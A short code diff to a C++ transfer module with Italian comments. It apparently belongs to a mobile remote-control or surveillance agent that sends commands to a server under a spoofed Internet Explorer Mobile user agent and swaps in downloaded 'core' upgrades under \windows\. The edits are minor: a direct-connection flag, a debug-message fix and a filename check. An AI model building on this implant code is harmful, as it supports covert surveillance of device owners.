@@ -1019,7 +1019,7 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 		return FALSE;
 	}
 
-	hOpenHandle = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.6)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	hOpenHandle = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.6)", INTERNET_OPEN_TYPE_DIRECT /*INTERNET_OPEN_TYPE_PRECONFIG*/, NULL, NULL, 0);
 
 	if (hOpenHandle == NULL) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [InternetOpen()] ", 4, TRUE);
@@ -1540,7 +1540,7 @@ BOOL Transfer::RestGetUpgrade() {
 		pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);
 
 		if (pResponse == NULL) {
-			DBG_TRACE(L"Debug - Transfer.cpp - RestGetUploads() FAILED [RestSendCommand()] ", 4, TRUE);
+			DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [RestSendCommand()] ", 4, TRUE);
 			return FALSE;
 		}
 
@@ -1568,7 +1568,7 @@ BOOL Transfer::RestGetUpgrade() {
 		uFileLen = b.getInt();
 
 		// Verifichiamo il tipo di upgrade
-		if (wcsncmp(L"core-update", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
+		if (wcsncmp(L"core", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
 			// Se conosciamo il nostro nome, switchiamo il nuovo core
 			wstring strPathName = L"\\windows\\";
 
